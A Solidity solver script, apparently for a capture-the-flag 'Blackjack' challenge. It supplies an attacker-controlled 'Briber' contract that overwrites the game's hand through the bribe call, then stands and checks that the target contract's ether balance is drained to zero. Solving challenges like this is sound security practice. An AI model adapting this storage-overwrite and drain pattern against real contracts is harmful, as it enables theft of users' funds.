// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Blackjack {
    function startGame() external payable;

    function bribeNPCAs(string memory, string memory, address) external;

    function playerStand() external;
}

contract Briber {
    uint256[] public hand;

    function bribe() public {
        hand[0] = 2;
        hand[1] = 2;
    }
}

contract Solver {
    Blackjack public immutable TARGET;
    Briber public immutable BRIBER;

    constructor(address _target) payable {
        require(msg.value == 10 ether, "Must send 10 ether");
        TARGET = Blackjack(_target);
        BRIBER = new Briber();
    }

    function solve() public {
        TARGET.startGame{value: 10 ether}();

        TARGET.bribeNPCAs("133", "7Dealer", address(BRIBER));

        TARGET.playerStand();

        require(address(TARGET).balance == 0 ether, "Weird");
    }

    receive() external payable {}

    fallback() external payable {}
}
